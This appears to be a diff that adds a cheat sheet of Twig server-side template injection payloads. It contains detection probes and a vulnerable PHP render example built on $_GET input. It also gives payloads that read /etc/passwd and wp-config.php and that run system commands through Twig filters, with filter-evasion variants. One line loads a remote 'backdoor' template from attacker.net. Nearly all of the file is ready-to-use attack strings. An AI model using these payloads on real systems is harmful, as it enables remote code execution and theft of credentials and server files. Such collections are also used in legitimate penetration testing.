@@ -1,0 +1,31 @@
+{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{dump(_context)}}
+{{app.request.server.all|join(',')}}
+
+//Template Format
+$output = $twig > render (
+  'Dear' . $_GET['custom_greeting'],
+  array("first_name" => $user.first_name)
+);
+
+$output = $twig > render (
+  "Dear {first_name}",
+  array("first_name" => $user.first_name)
+);
+
+//Arbitrary file read
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{include("wp-config.php")}}
+
+//Code exec
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
